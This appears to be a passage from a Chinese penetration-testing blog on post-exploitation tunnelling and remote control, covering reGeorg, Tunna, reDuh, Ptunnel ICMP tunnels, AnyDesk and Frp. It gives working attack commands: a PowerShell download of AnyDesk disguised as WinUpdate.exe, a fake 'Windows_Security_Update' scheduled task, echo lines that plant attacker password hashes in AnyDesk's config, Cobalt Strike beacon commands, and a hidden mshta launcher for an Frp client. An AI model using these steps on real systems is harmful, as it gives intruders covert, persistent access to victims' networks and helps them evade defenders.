root@John:~reGeorg# ls
LICENSE.html LICENSE.txt README.md reGeorgSocksProxy.py tunnel.ashx tu
nnel.aspx tunnel.js tunnel.jsp tunnel.nosocket.php tunnel.php tunnel.tomcat.5.jsp
root@John:~/reGeorg# python reGeorgSocksProxy.py ‐h


_____
_____ ______ __|___ |__ ______ _____ _____ ______
| | | ___|| ___| || ___|/ \| | | ___|
| \ | ___|| | | || ___|| || \ | | |
|__|\__\|______||______| __||______|\_____/|__|\__\|______|
|_____|
... every office needs a tool like Georg 

willem@sensepost.com / @_w_m__
sam@sensepost.com / @trowalts
etienne@sensepost.com / @kamp_staaldraad 

usage: reGeorgSocksProxy.py [‐h] [‐l] [‐p] [‐r] ‐u [‐v] 

Socks server for reGeorg HTTP(s) tunneller 

optional arguments:
‐h, ‐‐help show this help message and exit
‐l , ‐‐listen‐on The default listening address
‐p , ‐‐listen‐port The default listening port
‐r , ‐‐read‐buff Local read buffer, max data to be sent per POST
‐u , ‐‐url The url containing the tunnel script
‐v , ‐‐verbose Verbose output[INFO\|DEBUG]
</code></pre>
<pre><code>root@John:~/reGeorg# pip install urllib3
Requirement already satisfied: urllib3 in /usr/lib/python2.7/dist‐packages (1.24)
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926222242940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<p>以aspx为demo</p>
<p><img src="https://img-blog.csdnimg.cn/2020092622230823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>攻击机执行：</p>
<pre><code>python reGeorgSocksProxy.py ‐p 8080 ‐l 192.168.1.5 ‐u http://192.168.1.119/tunnel.aspx
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926222447685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
Windows下配合Proxifier：</p>
<p><img src="https://img-blog.csdnimg.cn/20200926222505727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926222514897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
目前大部分waf都会针对默认原装版本的reGeorg</p>
<pre><code>https://micro8.gitbook.io/micro8/contents-1/91-100/98http-sui-dao-regeorg-di-er-ji
</code></pre>
<hr>
<h2><a id="33_HTTP__Tunna_6880"></a>3.3 HTTP 隧道 Tunna</h2>
<p><strong>Tunna简介：</strong></p>
<p>Tunna1.1 是 secforce 在2014年11月出品的一款基于HTTP隧道工具。其中v1.1中支持了SOCKS4a。</p>
<p><strong>Tunna演示稿：</strong></p>
<pre><code>https://drive.google.com/open?id=1PpB8_ks93isCaQMEUFf_cNvbDsBcsWzE
</code></pre>
<p><strong>Github：</strong></p>
<pre><code>https://github.com/SECFORCE/Tunna
</code></pre>
<p><strong>攻击机：</strong></p>
<pre><code>192.168.1.5 Debian
192.168.1.4 Windows 7
</code></pre>
<p><strong>靶机：</strong></p>
<pre><code>192.168.1.119 Windows 2003
</code></pre>
<p><strong>安装：</strong></p>
<pre><code>root@John:~# git clone https://github.com/SECFORCE/Tunna.git
Cloning into 'Tunna'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 156 (delta 0), reused 2 (delta 0), pack‐reused 150
Receiving objects: 100% (156/156), 8.93 MiB | 25.00 KiB/s, done.
Resolving deltas: 100% (84/84), done.
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926222740664.png#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<p>以aspx为demo</p>
<p><img src="https://img-blog.csdnimg.cn/20200926222802892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>攻击机执行：</strong></p>
<pre><code>python proxy.py ‐u http://192.168.1.119/conn.aspx ‐l 1234 ‐r 3389 ‐s ‐ v
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926222830104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926222836817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>附录：</strong><br>
解决：<code>General Exception: [Errno 104] Connection reset by peer</code></p>
<pre><code>[+] Spawning keep‐alive thread
[‐] Keep‐alive thread not required
[+] Checking for proxy: False
</code></pre>
<p>连接后，出现</p>
<pre><code>General Exception: [Errno 104] Connection reset by peer
</code></pre>
<p>等待出现：无法验证此远程计算机的身份，是否仍要连接？</p>
<p>再次运行，在点击是(Y)</p>
<pre><code>python proxy.py ‐u http://192.168.1.119/conn.aspx ‐l 1234 ‐r 3389 ‐s ‐ v
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926222944505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926222950939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200926222957324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如果：没有出现“无法验证此远程计算机的身份，是否仍要连接？”</p>
<p>注册表键值： HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers 删除对应IP键值即可。</p>
<p>Tunna对PHP的支持并不是太友好</p>
<pre><code>https://micro8.gitbook.io/micro8/contents-1/91-100/99http-sui-dao-tunna-di-san-ji
</code></pre>
<hr>
<h2><a id="34_HTTP__reDun_6968"></a>3.4 HTTP 隧道 reDun</h2>
<p><strong>reDuh简介：</strong></p>
<p>reDuh是sensepost由2008-07年发布，从本质上讲，可以将JSP/PHP/ASP/ASPX等页面上传到目标服务器，便可以访问该服务器后面的主机。</p>
<p><strong>BlackHat USA 2008介绍：</strong></p>
<pre><code>https://drive.google.com/open?id=1AqmtuBnHQJS-FjVHzJMNNWokda048By-
</code></pre>
<p><strong>Github：</strong></p>
<pre><code>https://github.com/sensepost/reDuh
</code></pre>
<p><strong>攻击机：</strong></p>
<pre><code>192.168.1.5 Debian
192.168.1.4 Windows 7
</code></pre>
<p><strong>靶机：</strong></p>
<pre><code>192.168.1.119 Windows 2003
</code></pre>
<p><strong>安装：</strong></p>
<pre><code>root@John:~# git clone https://github.com/sensepost/reDuh.git
Cloning into 'reDuh'...
remote: Enumerating objects: 47, done.
remote: Total 47 (delta 0), reused 0 (delta 0), pack‐reused 47
Unpacking objects: 100% (47/47), done.
root@John:~# cd reDuh/
root@John:~/reDuh# ls
README.markdown reDuhClient reDuhServers
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926223247289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<p>以aspx为demo</p>
<p><img src="https://img-blog.csdnimg.cn/20200926223310544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>攻击机执行：</strong></p>
<p>绑定端口：</p>
<pre><code>root@John:~/reDuh/reDuhClient/dist# java ‐jar reDuhClient.jar http://192.168.1.119/reDuh.aspx
[Info]Querying remote web page for usable remote service port
[Info]Remote RPC port chosen as 42000
[Info]Attempting to start reDuh from 192.168.1.119:80/reDuh.aspx. Using service port 42000. Please wait...
[Info]reDuhClient service listener started on local port 1010
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926223334235.png#pic_center" alt="在这里插入图片描述"><br>
开启新terminal，建立隧道</p>
<p><strong>命令如下：</strong></p>
<pre><code>root@John:~# telnet 127.0.0.1 1010
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Welcome to the reDuh command line
&gt;&gt;[createTunnel]30080:127.0.0.1:80
Successfully bound locally to port 30080. Awaiting connections.
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926223402868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
攻击机端口前后对比：</p>
<pre><code>root@John:~# netstat ‐ntlp
Active Internet connections (only servers)
Proto Recv‐Q Send‐Q Local Address Foreign Address State PID/Program na me
tcp 0 0 0.0.0.0:902 0.0.0.0:* LISTEN 809/vmware‐authdlau
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 674/sshd
tcp6 0 0 :::902 :::* LISTEN 809/vmware‐authdlau
tcp6 0 0 :::22 :::* LISTEN 674/sshd
root@John:~# netstat ‐ntlp
Active Internet connections (only servers)
Proto Recv‐Q Send‐Q Local Address Foreign Address State PID/Program na me
tcp 0 0 0.0.0.0:902 0.0.0.0:* LISTEN 809/vmware‐authdlau
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 674/sshd
tcp6 0 0 :::902 :::* LISTEN 809/vmware‐authdlau
tcp6 0 0 :::1010 :::* LISTEN 6102/java
tcp6 0 0 :::22 :::* LISTEN 674/sshd
tcp6 0 0 :::30080 :::\* LISTEN 6102/java
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926223421514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
访问攻击机30080端口，既等价于访问靶机80端口</p>
<pre><code>root@John:~# curl http://192.168.1.5:30080/
&lt;html&gt; 

&lt;head&gt;
&lt;meta HTTP‐EQUIV="Content‐Type" Content="text/html; charset=gb2312"&gt; 

&lt;title ID=titletext&gt;建设中&lt;/title&gt;

&lt;/head&gt; 

&lt;body bgcolor=white&gt; 

... 

&lt;/body&gt;

&lt;/html&gt;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200926223445237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
遗憾的是reDuh年代久远，使用繁琐，并官方已停止维护。但是它奠定了HTTP隧道</p>
<pre><code>https://micro8.gitbook.io/micro8/contents-1/91-100/100http-sui-dao-reduh-di-si-ji
</code></pre>
<hr>
<h2><a id="35__Ptunnel_ICMP_7092"></a>3.5 基于 Ptunnel 建立ICMP隧道</h2>
<p><strong>前言</strong></p>
<p>在某些渗透测试环境下，获得了一个主机的权限但是该主机没有访问外网的权限，对于这种较为严格的网络环境，第一时间想到的就是隧道技术。常见的隧道技术有SSH\DNS\ICMP\端口转发等，大多数端口都存在被禁用的可能，但是ICMP作为基础服务被禁用的可能性却极小，在常用协议都被禁用的情况下可以考虑使用ICMP隧道。</p>
<p><strong>网络拓扑</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20200927202516165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
内网主机10.10.10.0/24除了ICMP通讯不能主动访问外网任何资源，20.20.20.101为hack的ICMP隧道服务端</p>
<p><strong>准备工作</strong></p>
<p>由于通过ICMP协议建立隧道，为了让隧道服务端能够处理收到的ICMP报文，需要禁用系统本身的ICMP响应机制，这里先关闭hack机器的ICMP响应机制</p>
<pre><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all
</code></pre>
<p><strong>Ptunnel的使用</strong></p>
<p>安装需要的依赖包并编译Ptunnel</p>
<pre><code># yum install libpcap libpcap-devel flex bison -y
# tar xf PingTunnel-0.72.tar.gz
# cd PingTunnel
# make
</code></pre>
<p>Ptunnel常用的参数</p>
<p>-p 指定跳板机的IP<br>
-l 指定转发本地监听的端口<br>
-da 指定最终要访问的目标主机<br>
-dp 指定最终要访问目标主机的端口<br>
PS：跳板机要有访问目标主机的权限！</p>
<p>在hack机器上开启ptunnel隧道监听<br>
<img src="https://img-blog.csdnimg.cn/20200927202632508.png#pic_center" alt="在这里插入图片描述"><br>
在client1连接跳板机20.20.20.101，访问client本地的8000端口，跳转到跳板机本地的22端口<br>
<img src="https://img-blog.csdnimg.cn/2020092720264548.png#pic_center" alt="在这里插入图片描述"><br>
查看本地已经监听8000端口<img src="https://img-blog.csdnimg.cn/20200927202655801.png#pic_center" alt="在这里插入图片描述"><br>
client1连接本地8000端口即可通过ICMP隧道连接到跳板机的22端口<br>
<img src="https://img-blog.csdnimg.cn/20200927202716798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="image"></p>
<p>也可以通过ssh over icmp隧道，建立socks代理访问外网<br>
<img src="https://img-blog.csdnimg.cn/20200927202727380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>https://rosetscmite.github.io/2018/12/18/基于Ptunnel建立ICMP隧道/
</code></pre>
<hr>
<h2><a id="36_anydesk_7142"></a>3.6 使用anydesk做远控</h2>
<p>anydesk是类似teamviewer的远程管理软件，但是他不用安装且体积小</p>
<p><strong>场景举例</strong></p>
<p>1）有云锁，护卫神等禁止3389登录时<br>
2）类似阿里云这种，登录3389会报警<br>
3）连接内网中可以出网的windows机器</p>
<p><strong>注意事项</strong></p>
<p>1）启动anydesk的权限需要桌面用户权限，比如，IIS做中间件的环境中，拿到了webshell一般都是没有桌面用户权限的，如果启动anydesk不会成功</p>
<p>2）启动anydesk时桌面不能被注销</p>
<p>3）有可能连接上去是黑屏，这个是因为该桌面用户退出远程桌面但没有注销，此时，除非能用<br>
winlogon启动anydesk，否则没法使用屏幕</p>
<pre><code>https://www.zhihuifly.com/t/topic/1121

https://422926799.github.io/posts/6b1dcf8a.html
</code></pre>
<p>这里是还有很骚气的方法，往后在亲自复现…</p>
<hr>
<p>复现另外的方法…</p>
<p><strong>AnyDesk利用</strong></p>
<p>AnyDesk 是一款声称速度最快的免费长途衔接/长途桌面操控软件，据说是前 TeamViewer 开发小组人员自立门户的商品，它拥有领先的视频压缩技能 DeskRT， 能够轻松穿透防火墙/路由器。  重点是不用安装，而且体积只有2,917KB。<br>
镜外诈骗人员使用修改版本做为远控，发给受害人获取控制电脑权限。</p>
<p>本地anydesk设置自主访问密码，然后生成的配置文件放到目标中，这样只要获取ad.anynet.id即可连接。收费版支持命令行反回ad.anynet.id与设置密码。不需要像免费版这么复杂。</p>
<p><strong>使用场景</strong></p>
<pre><code>云锁，护卫神等禁止3389登录绕过；

阿里云登录3389则会IP报警提示绕过；

内网穿透机器、传输文件等；

白名单软件过全世界所有杀软、流量加密；

BlackRouter勒索软件通过AnyDesk捆绑进行传播；
</code></pre>
<p><strong>支持操作系统</strong></p>
<pre><code>Windows
MacOS
Android
IOS
Linux
FreeBSD
Raspberry Pi
Chrome OS
</code></pre>
<p><strong>利用条件</strong></p>
<pre><code>桌面用户权

anydesk时桌面不能被注
</code></pre>
<p><strong>首先本机生成密码:</strong><br>
<img src="https://img-blog.csdnimg.cn/20200927205157982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
配置文件将会保存在：<br>
<img src="https://img-blog.csdnimg.cn/2020092720521626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
service.conf存放</p>
<pre><code>ad.anynet.pwd_hash与ad.anynet.pwd_salt提取出来。
</code></pre>
<p>system.conf存放：</p>
<pre><code>ad.anynet.id
</code></pre>
<p>Webshell中将Anydesk上传受害者机器，运行一遍Anydesk，然后kill掉</p>
<pre><code>taskkill /F /IM AnyDesk.exe
</code></pre>
<p>在进入到</p>
<pre><code>C:\Users\{username}\AppData\Roaming\AnyDesk
</code></pre>
<p>路径把以上两个配置写入到service.conf文件下<br>
<img src="https://img-blog.csdnimg.cn/20200927205313505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
连接：<br>
<img src="https://img-blog.csdnimg.cn/20200927205337752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令复现</p>
<pre><code>powershelgl.exe "(New-Object System.Net.WebClient).DownloadFile(\"https://download.anydesk.com/AnyDesk.exe\",\"C:\inetpub\wwwroot\WinUpdate.exe\")"
</code></pre>
<p>确定有哪些用户当前正在使用桌面：</p>
<pre><code>powershelgl.exe "(((Get-WmiObject -Class Win32_Process -Filter 'Name=\"explorer.exe\"').GetOwner().User) -split '\n')"
</code></pre>
<p>创建一个计划任务:</p>
<pre><code>schtasks /Create /TN Windows_Security_Update /SC monthly /tr "C:\inetpub\wwwroot\WinUpdate.exe" /RU administrator
</code></pre>
<p>先执行一次生成配置文件：</p>
<pre><code>schtasks /run /tn Windows_Security_Update
</code></pre>
<p>结束掉进程：</p>
<pre><code>taskkill /F /IM WinUpdate.exe
</code></pre>
<p>添加密码</p>
<pre><code>echo ad.anynet.pwd_hash=a7f9ef816567ddeb071c985771698c70a6aec4c70dc284943b3104dcc06b8184 &gt;&gt; C:\Users\administrator\AppData\Roaming\AnyDesk\service.conf
echo ad.anynet.pwd_salt=5afbd8fc7334032ddbddd489363e25f8 &gt;&gt; C:\Users\administrator\AppData\Roaming\AnyDesk\service.conf
</code></pre>
<p>利用需要一定条件，除此之外也需要考虑WebShell免杀。</p>
<pre><code>https://www.moonsec.com/archives/1098   --云渗透思路
</code></pre>
<hr>
<h2><a id="37_Kerberos_7285"></a>3.7 Kerberos域内委派攻击（重要了解）</h2>
<pre><code>https://xz.aliyun.com/t/7217   --域渗透——Kerberos委派攻击

https://xz.aliyun.com/t/7517   --Kerberos之域内委派攻击

https://422926799.github.io/posts/4d3be28.html    --跟着先知社区复现文章

https://www.cnblogs.com/backlion/p/10537813.html  --老文章思路

https://www.anquanke.com/post/id/166934   --攻击活动目录：无约束委派及域林信任

https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html   --最详细的介绍，有视频，但是全英文，感谢大佬
</code></pre>
<p>认真看完，就能熟悉了…</p>
<hr>
<h2><a id="38_ATTCK_7304"></a>3.8 ATT&amp;CK攻防初窥系列-执行篇</h2>
<pre><code>https://zhuanlan.kanxue.com/article-9787.htm   --ATT&amp;CK攻防初窥系列--执行篇（一）

https://zhuanlan.kanxue.com/article-10014.htm   ---ATT&amp;CK攻防初窥系列--执行篇（二）

https://zhuanlan.kanxue.com/article-9857.htm   ---ATT&amp;CK攻防初窥系列--横向移动篇（一）
</code></pre>
<p>感谢看雪大佬！！</p>
<hr>
<h2><a id="39_PowershelldayuTwelfth_Day_7316"></a>3.9 Powershell（dayu-Twelfth Day）</h2>
<h2><a id="391_360_powershell_7317"></a>3.9.1 利用360正则不严执行 powershell上线</h2>
<p>powershell无文件利用自blackhat演讲至今已经过去近5年,将来的日子会越来越不好过，windows的审计会越来越细，以后将是.NET的天下。从CS推荐使用.NET内存加载开始就已经慢慢变成红队的主流（execute-assembly）</p>
<pre><code>https://xz.aliyun.com/t/7903   --感谢大佬的思路和技术，6月份最新的复现

https://www.chabug.org/web/1324.html   --感谢s1ye大佬
</code></pre>
<p>书中还有更好的思路，找时间按照书里的复现写出来…</p>
<hr>
<h2><a id="392__Powershell_7330"></a>3.9.2 关于 Powershell抗安全软件</h2>
<pre><code>https://www.kanxue.com/book-38-473.htm   --看雪高级渗透课堂！

https://zhuanlan.zhihu.com/p/36250656   --原文

</code></pre>
<p>参考</p>
<pre><code>https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ff629472(v=msdn.10)?redirectedfrom=MSDN

https://github.com/danielbohannon/Invoke-Obfuscation
</code></pre>
<hr>
<h2><a id="393_InvokeObfuscation_7346"></a>3.9.3 Invoke-Obfuscation介绍</h2>
<pre><code>https://buaq.net/go-23754.html   --powershell配合Invoke-Obfuscation

https://www.anquanke.com/post/id/86637    --powershell 混淆

https://cloud.tencent.com/developer/article/1044940   --Powershell编码与混淆
</code></pre>
<hr>
<h1><a id="_7357"></a>四、穿透与转发</h1>
<h2><a id="41_Frp_7358"></a>4.1 Frp内网穿透实战</h2>
<p><strong>前言</strong></p>
<p>实战中，当通过某种方式拿下测试虚拟机权限时，发现该机器可出网。此时为了内网横向渗透与团队间的协同作战，可以利用Frp在该机器与VPS之间建立一条“专属通道”，并借助这条通道达到内网穿透的效果。实战中更多时候依靠 Socks5 。</p>
<p>更多详细使用方法，可查看官方Github，这里不再赘述。</p>
<pre><code>https://github.com/fatedier/frp/
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/202009281415088.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>前期准备</strong><br>
先准备一台VPS与域名。</p>
<p>因某种情况会更换VPS地址，为了减少更改frp配置文件的次数，所以做域名泛解析。若更换VPS，直接编辑域名解析地址即可。<br>
<img src="https://img-blog.csdnimg.cn/20200928141553303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200928141543938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>下载地址</strong></p>
<p>Frp下载地址 [跨平台，实战中根据目标机版本选择下载]</p>
<pre><code>https://github.com/fatedier/frp/releases
</code></pre>
<p><strong>配置文件</strong></p>
<p><strong>服务端</strong></p>
<pre><code>#通用配置段

[common]

#frp服务端监听 [VPS]

bind_addr = 0.0.0.0

#frp服务器监听端口 [实战中可以用一些通透性较好的端口]

bind_port = 7007

#服务端Web控制面板登录端口 [通过控制面板，可以实时了解到数据收发情况。实战中用处不大]

dashboard_port = 6609

#服务端Web控制面板用户名与密码 [强口令]

dashboard_user = SuperMan

dashboard_pwd = WC3pvjmh2tt8

#日志输出位置，所有的日志信息都放到当前目录下的frps.log文件中

log_file = ./frps.log

#日志记录等级，有trace、debug、info、warn、error,通常情况下为info

log_level = info

#日志保留时间

log_max_days = 3

#验证凭据，服务端和客户端的凭据必须一样才能连接

auth_token = E0iQEBOdoJeh

#启用特权模式，从v0.10.0版本开始默认启用特权模式 [特权模式下，客户端更改配置无需更新服务端]

privilege_mode = true

#特权模式Token [强口令，建议随机生成]

privilege_token = kukezkHC8R1H

#特权模式允许分配的端口 [避免端口被滥用]

privilege_allow_ports = 4000-50000

#心跳检测超时时长

heartbeat_timeout = 30

#每个代理可以设置的连接池上限

max_pool_count = 20

#口令认证超时时间，一般不用改

authentication_timeout = 900

#指定子域名，后续将全部用域名的形式进行访问 [特权模式需下将 *.xxxx.online 解析到外网VPS上，即域名泛解析]

subdomain_host = xxxx.online
</code></pre>
<p><strong>客户端</strong></p>
<pre><code>#通用配置段

[common]

#frp服务端IP或域名 [实战中一般都会直接用域名]

server_addr = frp.xxxx.online

#frp服务器端口

server_port = 7007

#授权token，此处必须与服务端保持一致，否则无法建立连接

auth_token = E0iQEBOdoJeh

#启用特权模式 [特权模式下服务端无需配置]

privilege_mode = true

#特权模式 token,同样要与服务端完全保持一致

privilege_token = kukezkHC8R1H

#心跳检查间隔与超时时间

heartbeat_interval = 10

heartbeat_timeout = 30

#启用加密 [通信内容加密传输，有效防止流量被拦截]

use_encryption = true

#启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]

use_compression = true

#连接数量

pool_count = 20

#内网穿透通常用socks5

[socks5]

type = tcp

#连接VPS内网穿透的远程连接端口

remote_port = 9066

#使用插件socks5代理

plugin = socks5

#socks5连接口令 [根据实际情况进行配置]

#plugin_user = SuperMan

#plugin_passwd = ZBO0McQe6mE1
</code></pre>
<p><strong>执行部署</strong></p>
<p><strong>服务端</strong><br>
SSH连接到VPS上，后台启动frp服务端。</p>
<pre><code>root@Ubuntu:~# cd tools/frp/

root@Ubuntu:~/tools/frp# nohup ./frps -c frps.ini &amp;

root@Ubuntu:~/tools/frp# jobs -l

root@Ubuntu:~/tools/frp# cat frps.log
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020092814230191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>客户端</strong></p>
<p>将frpc.exe与frpc.ini传到目标机的同一目录下，直接运行。<br>
<img src="https://img-blog.csdnimg.cn/20200928142357115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到<br>
<img src="https://img-blog.csdnimg.cn/20200928142429377.png#pic_center" alt="在这里插入图片描述"><br>
但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作，所以可结合execute在目标机无输出执行程序</p>
<pre><code>beacon&gt; sleep 10

beacon&gt; execute c:/frpc.exe -c c:/frpc.ini

beacon&gt; shell netstat -ano |findstr 7007
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200928142501242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
或者，创建后台运行的bat脚本。</p>
<pre><code>@echo off

if "%1" == "h" goto begin

mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)&amp;&amp;exit

:begin

c:\frpc.exe -c c:\frpc.ini
</code></pre>
